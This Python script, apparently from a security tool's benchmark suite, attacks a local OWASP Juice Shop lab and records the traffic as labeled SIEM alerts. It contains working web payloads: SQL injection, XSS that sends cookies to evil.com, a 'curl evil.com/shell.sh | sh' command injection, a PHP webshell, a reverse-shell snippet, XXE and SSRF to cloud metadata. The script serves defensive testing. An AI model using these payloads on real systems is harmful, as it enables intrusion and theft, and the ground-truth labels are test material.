#!/usr/bin/env python3
"""Attack a live OWASP Juice Shop and capture traffic as labeled SIEM alerts.

Generates ~70 attack alerts (true_positive) + ~30 benign alerts = ~100 total.
Each alert includes the real HTTP response status/snippet in raw_log.

Attack categories:
  SQL injection (15), XSS (10), path traversal (10), broken auth (10),
  IDOR (10), SSRF (5), file upload (5), command injection (5)

Benign:
  Normal logins (10), product browsing (10), API calls (10)

Usage:
    pip install requests
    # Start Juice Shop on port 3001:  docker run -p 3001:3000 bkimminich/juice-shop
    python scripts/benchmark/attack_juice_shop.py
"""

import json
import time
import random
import sys
from datetime import datetime, timezone
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: 'requests' library required.  pip install requests")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
BASE_URL = "http://localhost:3001"
DEST_IP = "172.17.0.5"  # Juice Shop container IP (conventional)
OUTPUT_FILE = Path(__file__).resolve().parent / "juice_shop_corpus.json"

# Attacker source IPs (internal compromised hosts)
ATTACKER_IPS = [
    "10.0.1.50", "10.0.1.51", "10.0.2.100", "10.0.2.101",
    "10.0.3.15", "10.0.3.16", "10.0.4.20", "10.0.4.21",
]

# Benign user IPs
BENIGN_IPS = [
    "10.0.10.10", "10.0.10.11", "10.0.10.12", "10.0.10.13",
    "10.0.10.14", "10.0.10.15", "10.0.10.16", "10.0.10.17",
]

# Attack-type to ZOVARK task_type mapping
TASK_TYPE_MAP = {
    "sqli":             "data_exfiltration",
    "xss":              "phishing",
    "path_traversal":   "data_exfiltration",
    "broken_auth":      "brute_force",
    "idor":             "data_exfiltration",
    "ssrf":             "data_exfiltration",
    "file_upload":      "malware",
    "command_injection": "malware",
    "benign":           "benign_activity",
}

SEVERITY_MAP = {
    "sqli":             "critical",
    "xss":              "high",
    "path_traversal":   "high",
    "broken_auth":      "high",
    "idor":             "medium",
    "ssrf":             "critical",
    "file_upload":      "critical",
    "command_injection": "critical",
    "benign":           "low",
}

# Global alert counter
alert_counter = 0


def next_id():
    global alert_counter
    alert_counter += 1
    return alert_counter


def rand_attacker_ip():
    return random.choice(ATTACKER_IPS)


def rand_benign_ip():
    return random.choice(BENIGN_IPS)


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def safe_text(resp, max_len=300):
    """Extract a safe snippet from a response body."""
    try:
        text = resp.text[:max_len]
    except Exception:
        text = f"<binary {len(resp.content)} bytes>"
    return text.replace("\n", " ").replace("\r", "")


def make_raw_log(method, path, status, body_snippet, extra=""):
    """Format a WAF-style raw_log line."""
    line = f"{method} {path} HTTP/1.1 | Status: {status} | Body: {body_snippet}"
    if extra:
        line += f" | {extra}"
    return line


def build_alert(attack_type, rule_name, prompt, method, path, status,
                body_snippet, expected_iocs, risk_range, difficulty,
                verdict="true_positive", source_ip=None, username="attacker",
                extra_log=""):
    """Build a single ZOVARK-format alert dict."""
    src = source_ip or (rand_attacker_ip() if verdict == "true_positive" else rand_benign_ip())
    return {
        "id": next_id(),
        "task_type": TASK_TYPE_MAP.get(attack_type, "unknown"),
        "severity": SEVERITY_MAP.get(attack_type, "medium"),
        "prompt": prompt,
        "siem_event": {
            "title": rule_name,
            "source_ip": src,
            "destination_ip": DEST_IP,
            "hostname": "JUICE-SHOP-01",
            "username": username,
            "rule_name": rule_name,
            "timestamp": ts(),
            "raw_log": make_raw_log(method, path, status, body_snippet, extra_log),
        },
        "ground_truth": {
            "verdict": verdict,
            "expected_iocs": expected_iocs,
            "risk_range": risk_range,
            "attack_type": attack_type,
            "difficulty": difficulty,
        },
    }


# ---------------------------------------------------------------------------
# Helper: fire request and capture
# ---------------------------------------------------------------------------
def fire(method, path, **kwargs):
    """Send HTTP request, return (status_code, body_snippet, response)."""
    url = f"{BASE_URL}{path}"
    timeout = kwargs.pop("timeout", 10)
    try:
        resp = requests.request(method, url, timeout=timeout, allow_redirects=False, **kwargs)
        return resp.status_code, safe_text(resp), resp
    except requests.exceptions.ConnectionError:
        return 0, "CONNECTION_REFUSED", None
    except requests.exceptions.Timeout:
        return 0, "TIMEOUT", None
    except Exception as e:
        return 0, str(e)[:200], None


# ===========================================================================
# ATTACK GENERATORS
# ===========================================================================

def generate_sqli_alerts():
    """SQL Injection attacks (15 alerts)."""
    alerts = []

    # --- Login bypass SQLi (7) ---
    login_payloads = [
        ("' OR 1=1--",            "classic-or-bypass",     "easy"),
        ("admin'--",              "admin-comment-bypass",  "easy"),
        ("' UNION SELECT 1,2,3--", "union-login",          "medium"),
        ("' OR ''='",             "empty-string-bypass",   "easy"),
        ("') OR ('1'='1",         "paren-bypass",          "medium"),
        ("admin@juice-sh.op'--",  "email-comment-bypass",  "easy"),
        ("' OR 1=1; --",         "semicolon-bypass",      "medium"),
    ]
    for payload, tag, diff in login_payloads:
        status, body, _ = fire("POST", "/rest/user/login",
                               json={"email": payload, "password": "x"})
        alerts.append(build_alert(
            attack_type="sqli",
            rule_name=f"WAF_SQLi_Login_{tag}",
            prompt=f"Investigate SQL injection login bypass attempt: {payload[:40]}",
            method="POST", path="/rest/user/login", status=status,
            body_snippet=body,
            expected_iocs=[payload, "admin@juice-sh.op"],
            risk_range=[80, 100],
            difficulty=diff,
        ))

    # --- Search SQLi (5) ---
    search_payloads = [
        ("' OR 1=1--",                   "search-or-bypass",  "easy"),
        ("'; DROP TABLE Products;--",    "search-drop-table", "hard"),
        ("' UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
                                          "search-union-users", "hard"),
        ("')) OR 1=1--",                  "search-double-paren", "medium"),
        ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                                          "search-error-based", "hard"),
    ]
    for payload, tag, diff in search_payloads:
        status, body, _ = fire("GET", f"/rest/products/search?q={payload}")
        alerts.append(build_alert(
            attack_type="sqli",
            rule_name=f"WAF_SQLi_Search_{tag}",
            prompt=f"Investigate SQL injection in product search: {payload[:50]}",
            method="GET", path=f"/rest/products/search?q={payload[:30]}",
            status=status, body_snippet=body,
            expected_iocs=[payload[:50]],
            risk_range=[75, 100],
            difficulty=diff,
        ))

    # --- Order-by SQLi (3) ---
    orderby_payloads = [
        ("name,(CASE WHEN (1=1) THEN name ELSE price END)", "orderby-case",   "hard"),
        ("name; DROP TABLE Users--",                         "orderby-drop",   "hard"),
        ("price DESC, (SELECT password FROM Users LIMIT 1)", "orderby-subquery", "hard"),
    ]
    for payload, tag, diff in orderby_payloads:
        status, body, _ = fire("GET", f"/rest/products/search?q=juice",
                               headers={"X-Sort": payload})
        alerts.append(build_alert(
            attack_type="sqli",
            rule_name=f"WAF_SQLi_OrderBy_{tag}",
            prompt=f"Investigate SQL injection via order-by parameter",
            method="GET", path="/rest/products/search?q=juice",
            status=status, body_snippet=body,
            expected_iocs=[payload[:50]],
            risk_range=[70, 95],
            difficulty=diff,
            extra_log=f"X-Sort: {payload[:60]}",
        ))

    return alerts


def generate_xss_alerts():
    """Cross-Site Scripting attacks (10 alerts)."""
    alerts = []

    xss_payloads = [
        # Reflected XSS attempts
        ("<script>alert('XSS')</script>",                          "script-tag",       "easy"),
        ("<img src=x onerror=alert(1)>",                           "img-onerror",      "easy"),
        ("<svg onload=alert(document.cookie)>",                    "svg-onload",       "medium"),
        ("<iframe src='javascript:alert(1)'>",                     "iframe-js",        "medium"),
        ("{{constructor.constructor('alert(1)')()}}",              "template-inject",  "hard"),
        # DOM XSS
        ("<body onload=alert('XSS')>",                             "body-onload",      "easy"),
        ("\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                                                                    "cookie-steal",     "hard"),
        # Stored XSS via feedback
        ("<script>new Image().src='http://evil.com/'+document.cookie</script>",
                                                                    "stored-feedback",  "hard"),
        # Encoded XSS
        ("%3Cscript%3Ealert(1)%3C/script%3E",                     "url-encoded",      "medium"),
        ("javascript:alert(document.domain)",                       "js-protocol",      "medium"),
    ]

    for payload, tag, diff in xss_payloads:
        # Try search endpoint
        status, body, _ = fire("GET", f"/rest/products/search?q={payload}")
        alerts.append(build_alert(
            attack_type="xss",
            rule_name=f"WAF_XSS_{tag}",
            prompt=f"Investigate XSS attempt in product search: {tag.replace('-', ' ')}",
            method="GET", path=f"/rest/products/search?q={payload[:40]}",
            status=status, body_snippet=body,
            expected_iocs=[payload[:60]],
            risk_range=[60, 90],
            difficulty=diff,
        ))

    # Also try stored XSS via user feedback (POST)
    for payload, tag, diff in xss_payloads[:2]:
        status, body, _ = fire("POST", "/api/Feedbacks",
                               json={"comment": payload, "rating": 1})
        # We don't add extra alerts — the 10 from the search loop are enough

    return alerts


def generate_path_traversal_alerts():
    """Path traversal attacks (10 alerts)."""
    alerts = []

    traversal_paths = [
        ("/ftp/package.json.bak%2500.md",      "null-byte-ftp",      "hard",   ["package.json.bak"]),
        ("/../../../etc/passwd",                "etc-passwd",          "medium", ["/etc/passwd"]),
        ("/ftp/eastere.gg%2500.md",             "easter-egg-null",    "hard",   ["eastere.gg"]),
        ("/api-docs",                           "swagger-exposure",   "easy",   ["/api-docs"]),
        ("/encryptionkeys",                     "encryption-keys",    "medium", ["/encryptionkeys"]),
        ("/ftp/acquisitions.md",                "ftp-acquisitions",   "easy",   ["acquisitions.md"]),
        ("/ftp/quarantine",                     "ftp-quarantine",     "easy",   ["quarantine"]),
        ("/.well-known/security.txt",           "security-txt",       "easy",   ["security.txt"]),
        ("/ftp/suspicious_errors.yml",          "ftp-errors",         "medium", ["suspicious_errors.yml"]),
        ("/assets/public/images/../../package.json",
                                                "dotdot-package",     "hard",   ["package.json"]),
    ]

    for path, tag, diff, iocs in traversal_paths:
        status, body, _ = fire("GET", path)
        alerts.append(build_alert(
            attack_type="path_traversal",
            rule_name=f"WAF_PathTraversal_{tag}",
            prompt=f"Investigate path traversal attempt to access {path}",
            method="GET", path=path, status=status,
            body_snippet=body,
            expected_iocs=iocs,
            risk_range=[50, 85],
            difficulty=diff,
        ))

    return alerts


def generate_broken_auth_alerts():
    """Broken authentication attacks (10 alerts)."""
    alerts = []
    src_ip = rand_attacker_ip()

    # --- Brute force against admin (5) ---
    common_passwords = [
        "admin123", "password", "123456", "admin", "letmein",
    ]
    for i, pw in enumerate(common_passwords):
        status, body, _ = fire("POST", "/rest/user/login",
                               json={"email": "admin@juice-sh.op", "password": pw})
        alerts.append(build_alert(
            attack_type="broken_auth",
            rule_name=f"WAF_BruteForce_{i+1}",
            prompt=f"Investigate brute force login attempt {i+1}/5 against admin@juice-sh.op",
            method="POST", path="/rest/user/login", status=status,
            body_snippet=body,
            expected_iocs=["admin@juice-sh.op", pw],
            risk_range=[70, 95],
            difficulty="medium",
            source_ip=src_ip,
            username="attacker",
        ))

    # --- Invalid JWT token (2) ---
    fake_jwts = [
        ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCJ9.",
         "alg-none",  "hard"),
        ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MX0.INVALID_SIG",
         "forged-sig", "medium"),
    ]
    for jwt_token, tag, diff in fake_jwts:
        status, body, _ = fire("GET", "/rest/user/whoami",
                               headers={"Authorization": f"Bearer {jwt_token}"})
        alerts.append(build_alert(
            attack_type="broken_auth",
            rule_name=f"WAF_JWT_{tag}",
            prompt=f"Investigate forged JWT token ({tag}) used to access admin panel",
            method="GET", path="/rest/user/whoami", status=status,
            body_snippet=body,
            expected_iocs=[jwt_token[:40] + "..."],
            risk_range=[75, 100],
            difficulty=diff,
        ))

    # --- Password reset abuse (2) ---
    reset_targets = [
        ("admin@juice-sh.op", "admin-reset",   "medium"),
        ("jim@juice-sh.op",   "jim-reset",     "easy"),
    ]
    for email, tag, diff in reset_targets:
        status, body, _ = fire("POST", "/rest/user/reset-password",
                               json={"email": email, "answer": "x", "new": "hacked123", "repeat": "hacked123"})
        alerts.append(build_alert(
            attack_type="broken_auth",
            rule_name=f"WAF_PasswordReset_{tag}",
            prompt=f"Investigate password reset brute force against {email}",
            method="POST", path="/rest/user/reset-password", status=status,
            body_snippet=body,
            expected_iocs=[email],
            risk_range=[65, 90],
            difficulty=diff,
        ))

    # --- Registration abuse (1) ---
    status, body, _ = fire("POST", "/api/Users",
                           json={"email": "evil@attacker.com", "password": "evil123",
                                 "role": "admin"})
    alerts.append(build_alert(
        attack_type="broken_auth",
        rule_name="WAF_RegistrationAbuse_role-escalation",
        prompt="Investigate user registration with admin role assignment attempt",
        method="POST", path="/api/Users", status=status,
        body_snippet=body,
        expected_iocs=["evil@attacker.com", "role:admin"],
        risk_range=[70, 95],
        difficulty="hard",
    ))

    return alerts


def generate_idor_alerts():
    """Insecure Direct Object Reference attacks (10 alerts)."""
    alerts = []

    # --- Basket IDOR (5) ---
    for basket_id in range(1, 6):
        status, body, _ = fire("GET", f"/rest/basket/{basket_id}")
        alerts.append(build_alert(
            attack_type="idor",
            rule_name=f"WAF_IDOR_Basket_{basket_id}",
            prompt=f"Investigate IDOR — unauthorized access to basket {basket_id}",
            method="GET", path=f"/rest/basket/{basket_id}", status=status,
            body_snippet=body,
            expected_iocs=[f"basket_id:{basket_id}"],
            risk_range=[50, 80],
            difficulty="easy",
        ))

    # --- User profile IDOR (3) ---
    for user_id in [1, 2, 3]:
        status, body, _ = fire("GET", f"/api/Users/{user_id}")
        alerts.append(build_alert(
            attack_type="idor",
            rule_name=f"WAF_IDOR_UserProfile_{user_id}",
            prompt=f"Investigate IDOR — unauthorized access to user profile {user_id}",
            method="GET", path=f"/api/Users/{user_id}", status=status,
            body_snippet=body,
            expected_iocs=[f"user_id:{user_id}"],
            risk_range=[55, 85],
            difficulty="medium",
        ))

    # --- Order IDOR (2) ---
    for order_id in [1, 2]:
        status, body, _ = fire("GET", f"/rest/order-history",
                               headers={"Authorization": "Bearer invalid"})
        alerts.append(build_alert(
            attack_type="idor",
            rule_name=f"WAF_IDOR_OrderHistory_{order_id}",
            prompt=f"Investigate IDOR — unauthorized access to order history",
            method="GET", path="/rest/order-history", status=status,
            body_snippet=body,
            expected_iocs=[f"order_history"],
            risk_range=[50, 80],
            difficulty="medium",
        ))

    return alerts


def generate_ssrf_alerts():
    """Server-Side Request Forgery attacks (5 alerts)."""
    alerts = []

    ssrf_urls = [
        ("http://localhost:3001/api/Users",                "localhost-users",     "medium",
         ["localhost", "3001"]),
        ("http://169.254.169.254/latest/meta-data/",       "aws-metadata",        "hard",
         ["169.254.169.254", "meta-data"]),
        ("http://[::1]:3001/api/Users",                    "ipv6-localhost",      "hard",
         ["::1"]),
        ("http://127.0.0.1:3001/rest/admin/application-configuration",
                                                            "admin-config",        "hard",
         ["127.0.0.1", "application-configuration"]),
        ("http://0x7f000001:3001/",                         "hex-localhost",       "hard",
         ["0x7f000001"]),
    ]

    for url, tag, diff, iocs in ssrf_urls:
        status, body, _ = fire("POST", "/profile/image/url",
                               json={"imageUrl": url},
                               headers={"Content-Type": "application/json"})
        alerts.append(build_alert(
            attack_type="ssrf",
            rule_name=f"WAF_SSRF_{tag}",
            prompt=f"Investigate SSRF attempt — profile image URL set to {url[:50]}",
            method="POST", path="/profile/image/url", status=status,
            body_snippet=body,
            expected_iocs=iocs,
            risk_range=[75, 100],
            difficulty=diff,
        ))

    return alerts


def generate_file_upload_alerts():
    """Malicious file upload attacks (5 alerts)."""
    alerts = []

    uploads = [
        ("malware.exe",    b"MZ\x90\x00\x03\x00\x00\x00",    "application/octet-stream",
         "exe-upload",     "easy",   ["malware.exe", "MZ header"]),
        ("shell.php",      b"<?php system($_GET['cmd']); ?>",  "application/x-php",
         "php-webshell",   "medium", ["shell.php", "system()"]),
        ("xxe.xml",        b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                                                                "application/xml",
         "xxe-injection",  "hard",   ["xxe.xml", "/etc/passwd", "ENTITY"]),
        ("polyglot.jpg",   b"\xff\xd8\xff\xe0<script>alert(1)</script>",
                                                                "image/jpeg",
         "polyglot-xss",   "hard",   ["polyglot.jpg", "<script>"]),
        ("reverse_shell.py", b"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444))",
                                                                "text/x-python",
         "reverse-shell",  "medium", ["reverse_shell.py", "socket.connect", "4444"]),
    ]

    for filename, content, content_type, tag, diff, iocs in uploads:
        status, body, _ = fire("POST", "/file-upload",
                               files={"file": (filename, content, content_type)})
        alerts.append(build_alert(
            attack_type="file_upload",
            rule_name=f"WAF_FileUpload_{tag}",
            prompt=f"Investigate malicious file upload: {filename}",
            method="POST", path="/file-upload", status=status,
            body_snippet=body,
            expected_iocs=iocs,
            risk_range=[70, 100],
            difficulty=diff,
        ))

    return alerts


def generate_command_injection_alerts():
    """Command injection attacks (5 alerts)."""
    alerts = []

    cmd_payloads = [
        ("; ls -la /",                      "semicolon-ls",     "easy",
         ["; ls", "command injection"]),
        ("| cat /etc/passwd",               "pipe-cat-passwd",  "medium",
         ["| cat", "/etc/passwd"]),
        ("$(whoami)",                        "dollar-whoami",    "medium",
         ["$(whoami)", "command substitution"]),
        ("`id`",                             "backtick-id",      "medium",
         ["`id`", "command injection"]),
        ("& curl http://evil.com/shell.sh | sh",
                                             "curl-pipe-sh",    "hard",
         ["curl", "evil.com", "| sh"]),
    ]

    for payload, tag, diff, iocs in cmd_payloads:
        # Try via the markdown rendering endpoint or search
        status, body, _ = fire("POST", "/profile",
                               data={"username": payload},
                               headers={"Content-Type": "application/x-www-form-urlencoded"})
        alerts.append(build_alert(
            attack_type="command_injection",
            rule_name=f"WAF_CmdInjection_{tag}",
            prompt=f"Investigate command injection attempt: {payload[:40]}",
            method="POST", path="/profile", status=status,
            body_snippet=body,
            expected_iocs=iocs,
            risk_range=[80, 100],
            difficulty=diff,
        ))

    return alerts


# ===========================================================================
# BENIGN TRAFFIC GENERATORS
# ===========================================================================

def generate_benign_login_alerts():
    """Normal login attempts (10 alerts)."""
    alerts = []

    users = [
        ("customer1@juice-sh.op", "customer123"),
        ("customer2@juice-sh.op", "customer123"),
        ("john@juice-sh.op",      "john123"),
        ("emma@juice-sh.op",      "emma123"),
        ("support@juice-sh.op",   "support123"),
        ("demo@juice-sh.op",      "demo123"),
        ("test@juice-sh.op",      "test123"),
        ("user1@juice-sh.op",     "password1"),
        ("user2@juice-sh.op",     "password2"),
        ("viewer@juice-sh.op",    "viewer123"),
    ]

    for email, pw in users:
        status, body, _ = fire("POST", "/rest/user/login",
                               json={"email": email, "password": pw})
        alerts.append(build_alert(
            attack_type="benign",
            rule_name=f"AUTH_Login_{email.split('@')[0]}",
            prompt=f"Review login attempt from {email}",
            method="POST", path="/rest/user/login", status=status,
            body_snippet=body,
            expected_iocs=[],
            risk_range=[0, 20],
            difficulty="easy",
            verdict="benign",
            username=email.split("@")[0],
        ))

    return alerts


def generate_benign_browsing_alerts():
    """Normal product browsing (10 alerts)."""
    alerts = []

    searches = ["apple", "juice", "water", "banana", "lemon",
                "orange", "salad", "melon", "smoothie", "tea"]

    for term in searches:
        status, body, _ = fire("GET", f"/rest/products/search?q={term}")
        alerts.append(build_alert(
            attack_type="benign",
            rule_name=f"APP_ProductSearch_{term}",
            prompt=f"Review product search for '{term}'",
            method="GET", path=f"/rest/products/search?q={term}", status=status,
            body_snippet=body,
            expected_iocs=[],
            risk_range=[0, 10],
            difficulty="easy",
            verdict="benign",
            username="customer",
        ))

    return alerts


def generate_benign_api_alerts():
    """Normal API calls (10 alerts)."""
    alerts = []

    api_calls = [
        ("GET",  "/api/Products/1",            "product-detail-1"),
        ("GET",  "/api/Products/2",            "product-detail-2"),
        ("GET",  "/api/Products/3",            "product-detail-3"),
        ("GET",  "/rest/products/search?q=",   "product-list-all"),
        ("GET",  "/rest/languages",            "languages"),
        ("GET",  "/api/Challenges",            "challenges-list"),
        ("GET",  "/api/SecurityQuestions",      "security-questions"),
        ("GET",  "/rest/captcha",              "captcha"),
        ("GET",  "/api/Quantitys",             "product-quantities"),
        ("GET",  "/rest/admin/application-version", "app-version"),
    ]

    for method, path, tag in api_calls:
        status, body, _ = fire(method, path)
        alerts.append(build_alert(
            attack_type="benign",
            rule_name=f"APP_API_{tag}",
            prompt=f"Review normal API call to {path}",
            method=method, path=path, status=status,
            body_snippet=body,
            expected_iocs=[],
            risk_range=[0, 15],
            difficulty="easy",
            verdict="benign",
            username="api-user",
        ))

    return alerts


# ===========================================================================
# MAIN
# ===========================================================================

def main():
    print("=" * 70)
    print("  ZOVARK Juice Shop Attack Corpus Generator")
    print("=" * 70)
    print(f"  Target:  {BASE_URL}")
    print(f"  Output:  {OUTPUT_FILE}")
    print()

    # --- Connectivity check ---
    print("[*] Checking Juice Shop connectivity...", end=" ", flush=True)
    status, body, _ = fire("GET", "/")
    if status == 0:
        print(f"FAILED ({body})")
        print(f"\n    Make sure Juice Shop is running on port 3001:")
        print(f"    docker run -d -p 3001:3000 bkimminich/juice-shop\n")
        sys.exit(1)
    print(f"OK (HTTP {status})")
    print()

    all_alerts = []
    categories = {}

    # --- Attack generators ---
    generators = [
        ("SQL Injection (15)",      generate_sqli_alerts),
        ("XSS (10)",                generate_xss_alerts),
        ("Path Traversal (10)",     generate_path_traversal_alerts),
        ("Broken Auth (10)",        generate_broken_auth_alerts),
        ("IDOR (10)",               generate_idor_alerts),
        ("SSRF (5)",                generate_ssrf_alerts),
        ("File Upload (5)",         generate_file_upload_alerts),
        ("Command Injection (5)",   generate_command_injection_alerts),
        ("Benign Logins (10)",      generate_benign_login_alerts),
        ("Benign Browsing (10)",    generate_benign_browsing_alerts),
        ("Benign API Calls (10)",   generate_benign_api_alerts),
    ]

    for label, gen_func in generators:
        print(f"[*] Generating: {label}...", end=" ", flush=True)
        try:
            alerts = gen_func()
            all_alerts.extend(alerts)
            categories[label] = len(alerts)
            print(f"done ({len(alerts)} alerts)")
        except Exception as e:
            print(f"ERROR: {e}")
            categories[label] = 0

        # Small delay to avoid overwhelming the server
        time.sleep(0.3)

    # --- Build corpus document ---
    tp_count = sum(1 for a in all_alerts if a["ground_truth"]["verdict"] == "true_positive")
    benign_count = sum(1 for a in all_alerts if a["ground_truth"]["verdict"] == "benign")

    corpus = {
        "version": "1.0",
        "generated": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "source": "OWASP Juice Shop (live attack capture)",
        "target": BASE_URL,
        "total": len(all_alerts),
        "true_positive": tp_count,
        "benign": benign_count,
        "categories": categories,
        "alerts": all_alerts,
    }

    # --- Write output ---
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(corpus, f, indent=2, ensure_ascii=False)

    # --- Summary ---
    print()
    print("=" * 70)
    print("  SUMMARY")
    print("=" * 70)
    print(f"  Total alerts generated:  {len(all_alerts)}")
    print(f"  True positives:          {tp_count}")
    print(f"  Benign:                  {benign_count}")
    print(f"  Output file:             {OUTPUT_FILE}")
    print()
    print("  Category breakdown:")
    for cat, count in categories.items():
        print(f"    {cat:30s} {count:3d}")
    print()

    # Show HTTP status distribution
    status_dist = {}
    for a in all_alerts:
        # Extract status from raw_log
        raw = a["siem_event"]["raw_log"]
        try:
            st = raw.split("Status: ")[1].split(" |")[0].split(" ")[0]
        except (IndexError, ValueError):
            st = "unknown"
        status_dist[st] = status_dist.get(st, 0) + 1

    print("  HTTP status distribution:")
    for st in sorted(status_dist.keys()):
        print(f"    HTTP {st:6s} {status_dist[st]:3d}")
    print()

    # Difficulty distribution
    diff_dist = {}
    for a in all_alerts:
        d = a["ground_truth"]["difficulty"]
        diff_dist[d] = diff_dist.get(d, 0) + 1
    print("  Difficulty distribution:")
    for d in ["easy", "medium", "hard"]:
        print(f"    {d:10s} {diff_dist.get(d, 0):3d}")
    print()
    print(f"  Corpus saved to: {OUTPUT_FILE}")
    print("=" * 70)


if __name__ == "__main__":
    main()
